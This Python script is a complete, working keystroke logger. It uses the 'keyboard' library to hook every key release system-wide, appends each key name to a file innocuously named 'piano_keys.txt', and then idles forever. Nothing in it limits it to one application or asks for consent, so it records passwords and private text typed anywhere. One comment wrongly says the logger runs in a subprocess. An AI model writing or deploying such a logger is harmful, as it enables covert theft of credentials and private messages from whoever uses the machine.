import keyboard
import time
import os

# Our function to record all keys in a texte
def record_key(key):
    with open("piano_keys.txt", "a") as f:
        f.write(f"{key.name}")

#Create new file for record words in a text
filename = "piano_keys.txt"
file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)

# If no file we create one
if not os.path.isfile(file_path):
    with open(file_path, "w") as f:
        pass

# Every time the key are pushed we record it
keyboard.on_release(record_key)

# Then we launch the logger in subprocess
while True:
    time.sleep(1)
